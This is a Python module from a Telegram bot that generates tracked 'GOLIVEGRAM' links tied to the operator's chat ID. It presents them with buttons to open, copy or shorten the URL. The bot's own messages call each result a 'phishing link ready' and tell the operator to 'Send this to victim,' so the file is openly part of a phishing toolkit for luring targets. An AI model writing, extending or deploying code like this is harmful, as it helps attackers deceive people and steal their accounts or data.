from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
from bot.config import BASE_URL
from bot.utils.storage import link_cache

# ==========================================
# GOLIVEGRAM: LINK GENERATE
# ==========================================

def generate_golivegram_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/golive/{unique_id}?v={user_id}"
    link_cache[unique_id] = {
        "user_id": user_id,
        "time": time.time(),
        "type": "golivegram",
        "link": link
    }
    return link

# ==========================================
# GOLIVEGRAM: BUTTON HANDLER
# ==========================================

def handle_golive_button(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    link = generate_golivegram_link(user_id)

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="golive_copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="golive_back")
    )

    bot.send_message(
        user_id,
        f"✅ *GOLIVEGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ==========================================
# GOLIVEGRAM: INLINE CALLBACK HANDLERS
# ==========================================

def handle_golive_callback(bot, call):
    user_id = call.message.chat.id
    data = call.data

    if data == "golive_copy":
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
        return

    elif data == "golive_back":
        from bot.__init__ import start
        start(call.message)
        return

    elif data == "golive_menu":
        link = generate_golivegram_link(user_id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="golive_copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="golive_back")
        )
        bot.edit_message_text(
            f"✅ *GOLIVEGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return
